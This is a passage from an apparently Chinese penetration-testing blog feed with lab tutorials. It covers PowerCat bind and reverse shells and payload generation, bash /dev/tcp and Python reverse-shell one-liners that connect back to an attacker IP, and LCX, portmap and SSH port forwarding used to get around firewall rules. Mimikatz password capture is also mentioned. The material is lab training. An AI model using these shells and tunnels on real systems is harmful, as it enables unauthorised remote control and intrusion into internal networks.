id="PowerCat安装"><a href="#PowerCat安装" class="headerlink" title="PowerCat安装"></a>PowerCat安装</h2><p>1、下载地址</p><p><a href="https://github.com/besimorhino/powercat">https://github.com/besimorhino/powercat</a></p><p>2、下载下来导入</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq"><span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> .\powercat.ps1<br></code></pre></td></tr></table></figure><p>3、如果提示未能加载指定模块，则可能是权限问题，输入如下代码</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">Set</span>-ExecutionPolicy <span class="hljs-comment">Unrestricted</span><br></code></pre></td></tr></table></figure><p>4、输入如下命令可以查看帮助信息</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">powercat -h</span><br></code></pre></td></tr></table></figure><p>5、如下就是安装成功</p><img src="/img/image-20231031213943581.png" alt="image-20231031213943581" style="zoom:80%;" /> <h2 id="PowerCat命令"><a href="#PowerCat命令" class="headerlink" title="PowerCat命令"></a>PowerCat命令</h2><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-l监听连接</span><br><span class="hljs-deletion">-c连接到侦听器</span><br><span class="hljs-deletion">-p要连接或监听的端口</span><br><span class="hljs-deletion">-e执行</span><br><span class="hljs-deletion">-ep执行Powershell</span><br><span class="hljs-deletion">-r中继。格式：“-r tcp：10.1.1.1：443”</span><br><span class="hljs-deletion">-u通过UDP传输数据</span><br><span class="hljs-deletion">-dns通过dns传输数据</span><br><span class="hljs-deletion">-dnsft DNS故障阈值</span><br><span class="hljs-deletion">-t超时选项。默认值：60</span><br><span class="hljs-deletion">-I输入：文件路径（字符串），字节数组或字符串</span><br><span class="hljs-deletion">-o控制台输出类型：“主机”，“字节”或“字符串”</span><br><span class="hljs-deletion">-of输出文件路径</span><br><span class="hljs-deletion">-d连接后断开连接</span><br><span class="hljs-deletion">-rep中继器。断开连接后重新启动</span><br><span class="hljs-deletion">-g生成有效载荷</span><br><span class="hljs-deletion">-ge生成编码的有效载荷</span><br><span class="hljs-deletion">-h打印帮助消息</span><br></code></pre></td></tr></table></figure><h2 id="PowerCat实验"><a href="#PowerCat实验" class="headerlink" title="PowerCat实验"></a>PowerCat实验</h2><p>靶机：10.210.100.147（win7）</p><p>攻击机：10.210.99.82（win10）</p><h3 id="PowerCat和nc正向连接"><a href="#PowerCat和nc正向连接" class="headerlink" title="PowerCat和nc正向连接"></a>PowerCat和nc正向连接</h3><p>1、靶机使用powercat执行以下命令</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">powercat -l -<span class="hljs-selector-tag">p</span> <span class="hljs-number">9876</span> -e cmd<span class="hljs-selector-class">.exe</span> -v<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231031214353448.png" alt="image-20231031214353448"> </p><p>2、攻击机使用nc执行以下命令</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> <span class="hljs-number">10.210.100.147</span> <span class="hljs-number">9876</span> -vv<br></code></pre></td></tr></table></figure><p>3、查看返回结果</p><p><img src="/img/image-20231031214615285.png" alt="image-20231031214615285"></p><h3 id="PowerCat和nc反向连接"><a href="#PowerCat和nc反向连接" class="headerlink" title="PowerCat和nc反向连接"></a>PowerCat和nc反向连接</h3><p>1、靶机使用powercat执行以下命令</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">powercat</span> -c <span class="hljs-number">10.210.99.82</span> -p <span class="hljs-number">8888</span> -v -e cmd.exe<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231031215257587.png" alt="image-20231031215257587"></p><p>2、攻击机使用nc执行以下命令</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -l -p <span class="hljs-number">8888</span> -vv<br></code></pre></td></tr></table></figure><p>3、查看返回结果</p><img src="/img/image-20231031215231992.png" alt="image-20231031215231992" style="zoom:80%;" /> <h3 id="PowerCat和PowerCat反向连接"><a href="#PowerCat和PowerCat反向连接" class="headerlink" title="PowerCat和PowerCat反向连接"></a>PowerCat和PowerCat反向连接</h3><p>1、靶机使用powercat执行以下命令</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">powercat</span> -c <span class="hljs-number">10.210.99.82</span> -p <span class="hljs-number">4444</span> -v -ep<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231031220022315.png" alt="image-20231031220022315"></p><p>2、攻击机使用powercat执行以下命令</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">powercat</span> -l -p <span class="hljs-number">4444</span> -v<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231031220012899.png" alt="image-20231031220012899"></p><h3 id="PowerCat文件传输"><a href="#PowerCat文件传输" class="headerlink" title="PowerCat文件传输"></a>PowerCat文件传输</h3><p>1、靶机使用powercat执行以下命令</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">powercat -l -<span class="hljs-selector-tag">p</span> <span class="hljs-number">9999</span> -of test<span class="hljs-selector-class">.txt</span> -v<br></code></pre></td></tr></table></figure><p>2、攻击机使用powercat执行以下命令</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">powercat -c 靶机ip -<span class="hljs-selector-tag">p</span> <span class="hljs-number">9999</span> -<span class="hljs-selector-tag">i</span> D:test<span class="hljs-selector-class">.txt</span> -v<br></code></pre></td></tr></table></figure><h3 id="用powercat生成payload"><a href="#用powercat生成payload" class="headerlink" title="用powercat生成payload"></a>用powercat生成payload</h3><p>1、攻击机使用powercat执行以下命令生成payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">powercat</span> -l -p <span class="hljs-number">7777</span> -e cmd -v -g &gt;&gt; shell.ps1<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231031220644307.png" alt="image-20231031220644307"></p><p>2、在靶机上运行脚本</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">.\<span class="hljs-built_in">shell</span>.ps1<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231031221255306.png" alt="image-20231031221255306"> </p><p>3、攻击机使用powercat执行以下命令连接</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">powercat</span> -c <span class="hljs-number">10.210.100.147</span> -p <span class="hljs-number">7777</span> -v<br></code></pre></td></tr></table></figure><img src="/img/image-20231031221237264.png" alt="image-20231031221237264" style="zoom:67%;" /> <h1 id="Bash反弹shell"><a href="#Bash反弹shell" class="headerlink" title="Bash反弹shell"></a>Bash反弹shell</h1><h2 id="Bash介绍"><a href="#Bash介绍" class="headerlink" title="Bash介绍"></a>Bash介绍</h2><p> Shell也称为终端或壳，是人与内核之间的翻译官，而Bash则是Linux中默认使用的Shell</p><p>Bash 反弹Shell的命令如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">bash -i &gt;&amp;<span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/攻击机_IP/</span>攻击机端口 <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br>bash -i &gt;&amp;<span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/攻击机_IP/</span>攻击机端口 <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">2</span><br>bash -i &gt;&amp;<span class="hljs-regexp">/dev/u</span>dp<span class="hljs-regexp">/攻击机_IP/</span>攻击机端口 <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br>bash -i &gt;&amp;<span class="hljs-regexp">/dev/u</span>dp<span class="hljs-regexp">/攻击机_IP/</span>攻击机端口 <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>“bash -i”是指打开一个交互式的Shell</p><p>“&amp;”符号用于区分文件和文件描述符，**”&gt;&amp;”符号后面跟文件时，表示将标准输出和标准错误输出重定向至文件<strong>，</strong>“&gt;&amp;”符号后面跟数字时表示后面的数字是文件描述符**，不加”&amp;”符号则会把后面的数字当成文件。数字”0”,”1”,”2”是LinuxShell下的文件描述符， “0”是指标准输入重定向， “1”是 指标准输出重定向， “2”是指错误输出重定向。</p><p>“&#x2F;dev”目录下”tcp”和”udp”是Linux中的特殊设备，可用于建立Socket连接，读写这俩文件就相当于是在Socket连接中传输数据。**”&gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;攻击机_ip&#x2F;攻击机端口”则表示将标准输出和标准错误输出重定向到”&#x2F;dev&#x2F;tcp&#x2F;攻击机ip&#x2F;攻击机端口”文件中，也就是重定向到了攻击机**，这时目标机的命令执行结果可以从攻击机看到。</p><p><strong>“0&gt;&amp;1”或”0&gt;&amp;2”又将标准输入重定向到了标准输出</strong>，而标准输出重定向到了攻击机，因此标准输入也就重定向到了攻击机，从而可以通过攻击机输入命令，并且可以看到命令执行结果输出</p><h2 id="bash反弹shell实验"><a href="#bash反弹shell实验" class="headerlink" title="bash反弹shell实验"></a>bash反弹shell实验</h2><p>攻击机：10.210.99.82（windows）</p><p>靶机：10.210.100.148（linux）</p><p>1、攻击机器使用nc执行监听命令</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">9999</span> 监听 TCP<br><span class="hljs-attribute">nc</span> -lup <span class="hljs-number">9999</span> 监听UDP<br></code></pre></td></tr></table></figure><p>2、实验靶机执行连接命令</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -i &gt;&amp;/dev/tcp/<span class="hljs-number">10.210.99.82</span>/<span class="hljs-number">8889</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>3、查看结果</p><p><img src="/img/image-20231031223246688.png" alt="image-20231031223246688"></p><h1 id="Python-反弹Shell"><a href="#Python-反弹Shell" class="headerlink" title="Python 反弹Shell"></a>Python 反弹Shell</h1><h2 id="Python反弹Shell介绍"><a href="#Python反弹Shell介绍" class="headerlink" title="Python反弹Shell介绍"></a>Python反弹Shell介绍</h2><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl">python -c &#x27;import <span class="hljs-keyword">socket</span>,subprocess,os;s=<span class="hljs-keyword">socket</span>.<span class="hljs-keyword">socket</span>(<span class="hljs-keyword">socket</span>.AF_INET,<span class="hljs-keyword">socket</span>.SOCK_STREAM);s.connect((<span class="hljs-string">&quot;攻击机器IP&quot;</span>,端口));os.dup2(s.fileno(),<span class="hljs-number">0</span>); os.dup2(s.fileno(),<span class="hljs-number">1</span>); os.dup2(s.fileno(),<span class="hljs-number">2</span>);p=subprocess.call([<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>]);&#x27;<br></code></pre></td></tr></table></figure><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p>攻击机：10.210.99.82（windows）</p><p>靶机：10.210.100.147（linux python2）</p><p>1、攻击机器使用nc执行监听命令</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">8877</span> 监听TCP<br></code></pre></td></tr></table></figure><p>2、实验靶机执行连接命令</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl">python -c &#x27;import <span class="hljs-keyword">socket</span>,subprocess,os;s=<span class="hljs-keyword">socket</span>.<span class="hljs-keyword">socket</span>(<span class="hljs-keyword">socket</span>.AF_INET,<span class="hljs-keyword">socket</span>.SOCK_STREAM);s.connect((<span class="hljs-string">&quot;10.210.99.82&quot;</span>,<span class="hljs-number">8877</span>));os.dup2(s.fileno(),<span class="hljs-number">0</span>); os.dup2(s.fileno(),<span class="hljs-number">1</span>); os.dup2(s.fileno(),<span class="hljs-number">2</span>);p=subprocess.call([<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>]);&#x27;<br></code></pre></td></tr></table></figure><p>3、查看结果</p><p><img src="/img/image-20231031224719106.png" alt="image-20231031224719106"></p>]]></content>
    
    
    <categories>
      
      <category>内网隧道技术</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>端口转发相关工具和用法</title>
    <link href="/2023/11/27/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7%E5%92%8C%E7%94%A8%E6%B3%95/"/>
    <url>/2023/11/27/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7%E5%92%8C%E7%94%A8%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="端口转发相关工具和用法"><a href="#端口转发相关工具和用法" class="headerlink" title="端口转发相关工具和用法"></a>端口转发相关工具和用法</h1><h1 id="LCX端口转发"><a href="#LCX端口转发" class="headerlink" title="LCX端口转发"></a>LCX端口转发</h1><p>LCX是一款端口转发工具，分为Windows版和Linux版，Linux版本为PortMap。</p><p>LCX有端口映射和端口转发两大功能，例如当目标的3389端口只对内开放而不对外开放时，可以使用端口映射将3389端口映射到目标的其他端口使用；当目标处于内网或目标配置的策略只允许访问固定某一端口时，可以通过端口转发突破限制。 </p><p>Windows版的LCX用法:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml">端口转发：<br>Lcx -listen <span class="hljs-tag">&lt;<span class="hljs-name">监听slave请求的端口</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">等待连接的端口</span>&gt;</span><br>Lcx -slave <span class="hljs-tag">&lt;<span class="hljs-name">攻击机IP</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">监听端口</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">目标IP</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">目标端口</span>&gt;</span><br>端口映射：<br>Lcx -tran<span class="hljs-tag">&lt;<span class="hljs-name">等待连接的端口</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">目标IP</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">日标端口</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Linux版的LCX用法:</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">Usage:./portmap -m <span class="hljs-keyword">method</span> [-<span class="hljs-title function_">h1</span> <span class="hljs-title function_">host1</span>] -<span class="hljs-title function_">p1</span> <span class="hljs-title function_">port1</span> [-<span class="hljs-title function_">h2</span> <span class="hljs-title function_">host2</span>] -<span class="hljs-title function_">p2</span> <span class="hljs-title function_">port2</span> [-<span class="hljs-title function_">v</span>] [-<span class="hljs-title function_">log</span><br><span class="hljs-title function_">filename</span>]<br>-<span class="hljs-title function_">v</span>: version<br>-h1: host1<br>-h2: host2<br>-p1: port1<br>-p2: port2<br>-log: log the data<br>-m: the action <span class="hljs-keyword">method</span> <span class="hljs-title function_">for</span> <span class="hljs-title function_">this</span> <span class="hljs-title function_">tool</span><br>1: listen <span class="hljs-keyword">on</span> PORT1 <span class="hljs-keyword">and</span> connect <span class="hljs-keyword">to</span> HOST2:PORT2<br><span class="hljs-number">2</span>: listen <span class="hljs-keyword">on</span> PORT1 <span class="hljs-keyword">and</span> PORT2<br><span class="hljs-number">3</span>: connect <span class="hljs-keyword">to</span> HOST1:PORT1 <span class="hljs-keyword">and</span> HOST2:PORT2<br></code></pre></td></tr></table></figure><h2 id="LCX实验一"><a href="#LCX实验一" class="headerlink" title="LCX实验一"></a>LCX实验一</h2><h3 id="实验场景"><a href="#实验场景" class="headerlink" title="实验场景"></a>实验场景</h3><p>由于配置了防火墙只允许web访问，这个时候攻击者想访问3389端口，远程连接是不可以的，就需要使 用LCX进行端口转发</p><p>Web服务器开启了80端口，3389端口不允许出网，可以将web服务器的3389端口转发到允许出网的53 端口，这个时候攻击者在本地监听53端口并且转发到1111端口，这个时候攻击者连接自己的1111端 口，等于访问web服务器的3389端口</p><img src="/img/image-20231029171108877.png" alt="image-20231029171108877" style="zoom: 67%;" /> <h3 id="环境与问题解决"><a href="#环境与问题解决" class="headerlink" title="环境与问题解决"></a>环境与问题解决</h3><p>攻击机器：本机（10.210.99.82）</p><p>靶机：win7虚拟机（10.210.100.145）</p><p>1.解决主机ping不通虚拟机（开启防火墙）的问题：<a href="https://www.win10h.com/jiaocheng/41513.html">https://www.win10h.com/jiaocheng/41513.html</a></p><p>2.win7开启远程桌面连接</p><img src="/img/image-20231029171333081.png" alt="image-20231029171333081" style="zoom:67%;" /> <img src="/img/image-20231029171449216.png" alt="image-20231029171449216" style="zoom:80%;" />  <p>此时攻击机可以远程连接</p><p><img src="/img/image-20231029171412360.png" alt="image-20231029171412360"></p><p>win7新建规则：</p><img src="/img/image-20231029171657911.png" alt="image-20231029171657911" style="zoom:67%;" /> <p>此时无法远程连接</p><img src="/img/image-20231029171627882.png" alt="image-20231029171627882" style="zoom:67%;" /> <h3 id="实验复现"><a href="#实验复现" class="headerlink" title="实验复现"></a>实验复现</h3><p>流程：将攻击机的53端口的流量带到1111端口，然后将靶机的3389端口转发到攻击机的53端口，由于攻击机的53端口的流量被带到了1111端口，所以访问127.0.0.1:1111即访问靶机的3389端口</p><p>1、在攻击机器上运行以下命令，监听本地53端口并且转发到本地1111端口</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">lcx</span> -listen <span class="hljs-number">53</span> <span class="hljs-number">1111</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231029173504765.png" alt="image-20231029173504765"></p><p>2、在web靶机上运行以下命令， 将本地的3389端口转发到10.210.99.82的 53端口</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">lcx</span>.exe -slave <span class="hljs-number">10.210.99.82</span> <span class="hljs-number">53</span> <span class="hljs-number">127.0.0.1</span> <span class="hljs-number">3389</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231029173754694.png" alt="image-20231029173754694"></p><p><img src="/img/image-20231029173741335.png" alt="image-20231029173741335"></p><p>3、在攻击机器上运行远程桌面，地址为127.0.0.1:1111</p><p><img src="/img/image-20231029173903186.png" alt="image-20231029173903186"></p><p>后续可通过mimikatz抓取密码然后登录</p><p><img src="/img/image-20231029174400127.png" alt="image-20231029174400127"></p><h2 id="LCX实验二"><a href="#LCX实验二" class="headerlink" title="LCX实验二"></a>LCX实验二</h2><h3 id="实验场景-1"><a href="#实验场景-1" class="headerlink" title="实验场景"></a>实验场景</h3><p>Web服务器开启了80端口，3389端口不允许出网，可以将web服务器的3389端口转发到允许出网的53端口，这个时候攻击者在VPS监听54端口并且转发到1111端口，这个时候攻击者连接VPS的1111端口， 等于访问web服务器的3389端口</p><p><img src="/img/image-20231030214442769.png" alt="image-20231030214442769"></p><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>内网攻击机器：本机（10.210.99.82）</p><p>内网靶机：win7虚拟机（10.210.100.145）</p><p>vps：49.234.20.184</p><h3 id="实验复现-1"><a href="#实验复现-1" class="headerlink" title="实验复现"></a>实验复现</h3><p>1、在攻击机器上运行以下命令，监听本地54端口并且转发到本地1111端口</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">lcx</span>.exe -slave <span class="hljs-number">49.234.20.184</span> <span class="hljs-number">54</span> <span class="hljs-number">127.0.0.1</span> <span class="hljs-number">3389</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231030215919134.png" alt="image-20231030215919134"></p><p>2、在vps运行lcx -listen 54 1111，因为我的机器vps机器是linux系统所以使用portmap</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">./portmap -m <span class="hljs-number">2</span> -<span class="hljs-built_in">p1</span> <span class="hljs-number">54</span> -<span class="hljs-built_in">p2</span> <span class="hljs-number">1111</span><br></code></pre></td></tr></table></figure><img src="/img/image-20231030215521166.png" alt="image-20231030215521166" style="zoom:80%;" /> <p>3、在攻击机器上连接49.234.20.184:1111</p><p><img src="/img/image-20231030220015017.png" alt="image-20231030220015017"></p><p><img src="/img/image-20231030220045049.png" alt="image-20231030220045049"></p><h1 id="ssh端口转发（linux）"><a href="#ssh端口转发（linux）" class="headerlink" title="ssh端口转发（linux）"></a>ssh端口转发（linux）</h1><p>当上传工具被杀软杀掉之后可以考虑ssh端口转发</p><h2 id="SSH介绍"><a href="#SSH介绍" class="headerlink" title="SSH介绍"></a>SSH介绍</h2><p>SSH通过网络远程访问主机提供保护，可以对客户端和服务端之间的数据传输进行压缩和加密，有身份 验证、SCP、SFTP、和端口转发的功能</p><p>SSH转发常用的参数介绍：</p><img src="/img/image-20231030221128106.png" alt="image-20231030221128106" style="zoom:67%;" />  <h2 id="1、本地转发（正向访问A）"><a href="#1、本地转发（正向访问A）" class="headerlink" title="1、本地转发（正向访问A）"></a>1、本地转发（正向访问A）</h2><h3 id="实验场景-2"><a href="#实验场景-2" class="headerlink" title="实验场景"></a>实验场景</h3><p>现在有如下的网络，电脑A是攻击机器，可以直接访问电脑B,但是访问不了机器C,可以借助B机器上的 SSH命令进行端口转发访问机器C</p><p>1、以下是实验环境拓扑图:</p><img src="/img/image-20231030221452446.png" alt="image-20231030221452446" style="zoom: 50%;" /> <h3 id="实验环境-1"><a href="#实验环境-1" class="headerlink" title="实验环境"></a>实验环境</h3><p>攻击机器A（win11）：10.210.99.82</p><p>官网机器B（centos7）：10.210.100.146&#x2F;192.168.144.128</p><p>内网机器C（win7）：192.168.144.130</p><p>添加网卡</p><img src="/img/image-20231030222642149.png" alt="image-20231030222642149" style="zoom:67%;" /> <p>centos添加网络适配器vmnet4，两个网段</p><p><img src="/img/image-20231030224353877.png" alt="image-20231030224353877"></p><p>win7配置为vmnet4</p><p><img src="/img/image-20231030225857468.png" alt="image-20231030225857468"></p><p>网络情况如下：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">A</span>可以访问<span class="hljs-selector-tag">B</span><br><span class="hljs-selector-tag">B</span>可以访问C<br><span class="hljs-selector-tag">A</span>不能访问C<br></code></pre></td></tr></table></figure><h3 id="实验复现-2"><a href="#实验复现-2" class="headerlink" title="实验复现"></a>实验复现</h3><p>1、使用webshell或者其他其他的方式连接到B机器</p><p><img src="/img/image-20231030230300725.png" alt="image-20231030230300725"></p><p>2、使用转发的命令进行转发</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dns">ssh -CfNg -L 主机B端口:主机C_IP:主机C_端口 跳板主机B_IP<br>例如： ssh -CfNg -L <span class="hljs-number">3333:192.168</span>.<span class="hljs-number">144.130:3389</span> <span class="hljs-number">10.210.100.146</span>   然后输入密码即可<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231030231059468.png" alt="image-20231030231059468"></p><p>3、访问跳板机器的3333端口就可以访问内网机器的3389端口</p><p>这里需要关掉centos7的防火墙</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">systemctl stop firewalld<br></code></pre></td></tr></table></figure><img src="/img/image-20231030231505404.png" alt="image-20231030231505404" style="zoom:80%;" /> <p><img src="/img/image-20231030231613752.png" alt="image-20231030231613752"></p><h2 id="2、远程转发（反向访问A）"><a href="#2、远程转发（反向访问A）" class="headerlink" title="2、远程转发（反向访问A）"></a>2、远程转发（反向访问A）</h2><h3 id="实验场景-3"><a href="#实验场景-3" class="headerlink" title="实验场景"></a>实验场景</h3><p>攻击机者已经拿下了机器B 但是因为是内网机器所以无法直接访问，同时无法访问c主机，但是因为b有 ssh，我们使用远程转发  以下是实验环境拓扑图:</p><p><img src="/img/image-20231031095206801.png" alt="image-20231031095206801"></p><h3 id="实验环境-2"><a href="#实验环境-2" class="headerlink" title="实验环境"></a>实验环境</h3><p>攻击机器A（centos7 公网）：49.234.20.184</p><p>官网机器B（centos7 内网）：10.210.100.146&#x2F;192.168.144.128</p><p>内网机器C（ubuntu 内网）：192.168.144.131（需要安装ssh服务）</p><p>网络情况如下：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">B</span>可以访问<span class="hljs-selector-tag">A</span><br><span class="hljs-selector-tag">B</span>可以访问C<br><span class="hljs-selector-tag">A</span>访问不了<span class="hljs-selector-tag">B</span><br></code></pre></td></tr></table></figure><h3 id="实验复现-3"><a href="#实验复现-3" class="headerlink" title="实验复现"></a>实验复现</h3><p>1、通过反向连接（钓鱼）的方式连入公司的网络</p><p><img src="/img/image-20231031101732439.png" alt="image-20231031101732439"></p><p>2、在B机器上执行如下的转发命令</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">ssh</span> -CfNg -R 攻击者端口:目标主机<span class="hljs-built_in">IP</span>:目标主机端口 -<span class="hljs-meta">fN</span> 攻击者_<span class="hljs-built_in">IP</span><br>例如： ssh -CfNg -R <span class="hljs-number">1111</span>:<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">144</span>.<span class="hljs-number">131</span>:<span class="hljs-number">22</span> <span class="hljs-number">49</span>.<span class="hljs-number">234</span>.<span class="hljs-number">20</span>.<span class="hljs-number">184</span> 然后输入<span class="hljs-number">184</span>的密码即可<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231031110713144.png" alt="image-20231031110713144"></p><p><img src="/img/image-20231031110756262.png" alt="image-20231031110756262"> </p><p>3、在攻击的机器vps上访问1111端口就可以了（这里只能本地访问）</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> root@<span class="hljs-number">127.0.0.1</span> -p <span class="hljs-number">1111</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231031110916955.png" alt="image-20231031110916955"> </p><p><img src="/img/image-20231031110946392.png" alt="image-20231031110946392">  </p><h2 id="3、动态转发（类似socks代理）"><a href="#3、动态转发（类似socks代理）" class="headerlink" title="3、动态转发（类似socks代理）"></a>3、动态转发（类似socks代理）</h2><p>动态转发类似SOCKS代理，不仅仅是针对么某一个端口进行转发 后续学习</p><h1 id="NETSH端口转发（windows）"><a href="#NETSH端口转发（windows）" class="headerlink" title="NETSH端口转发（windows）"></a>NETSH端口转发（windows）</h1><h2 id="NETSH介绍"><a href="#NETSH介绍" class="headerlink" title="NETSH介绍"></a>NETSH介绍</h2><p>netsh是windows系统自带命令行程序，攻击者无需上传第三方工具即可利用netsh程序可进行端口转 发操作，可将内网中其他服务器的端口转发至本地访问运行这个工具需要管理员的权限</p><p><img src="/img/image-20231031111737880.png" alt="image-20231031111737880"></p><h2 id="netsh实验"><a href="#netsh实验" class="headerlink" title="netsh实验"></a>netsh实验</h2><h3 id="实验场景-4"><a 